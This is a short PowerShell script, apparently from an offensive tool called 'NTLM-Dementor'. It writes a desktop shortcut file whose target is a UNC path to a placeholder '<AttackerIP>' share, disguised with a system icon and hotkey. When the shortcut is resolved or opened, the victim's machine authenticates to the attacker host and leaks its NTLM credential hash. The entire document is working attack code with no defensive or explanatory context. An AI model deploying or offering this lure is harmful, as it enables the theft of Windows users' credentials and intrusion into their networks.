$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("$HOME\Desktop\.NTLM-Dementor.lnk")
$lnk.TargetPath = "\\<AttackerIP>\.NTLM-Dementor.xls"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "NTLM-Dementor LNK File"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
Write-Output "NTLM-Dementor .LNK File Saved successfully at $HOME\Desktop\NTLM-Dementor.lnk"